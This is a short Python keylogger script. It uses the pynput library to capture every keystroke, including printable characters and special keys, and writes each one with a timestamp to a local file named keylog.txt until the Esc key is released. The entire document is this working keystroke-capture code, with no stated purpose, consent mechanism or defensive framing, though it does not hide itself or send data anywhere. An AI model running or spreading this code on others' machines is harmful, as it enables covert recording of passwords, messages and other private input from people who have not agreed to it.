from pynput import keyboard
import logging

# Setup logging to a file
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key that was pressed
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Handle special keys (e.g., Enter, Shift, etc.)
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
